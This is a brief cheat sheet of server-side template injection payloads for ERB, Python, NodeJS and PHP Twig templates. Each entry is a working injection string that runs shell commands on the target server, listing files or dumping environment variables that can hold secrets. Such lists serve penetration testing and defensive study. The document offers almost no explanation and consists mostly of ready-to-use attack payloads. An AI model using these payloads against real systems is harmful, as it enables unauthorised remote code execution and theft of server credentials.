# SSTI

- ERB template
    
    ```jsx
    <%= 7*7 %>
    <%= system("ls") %>
    ```
    

```python
Python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}

NodeJS - Render Template
${process.mainModule.require('child_process').execSync('env').toString()}

PHP - Twig
<pre>{{ system("env") }}</pre>
<pre>{{ getenv()|join('\n') }}</pre>
```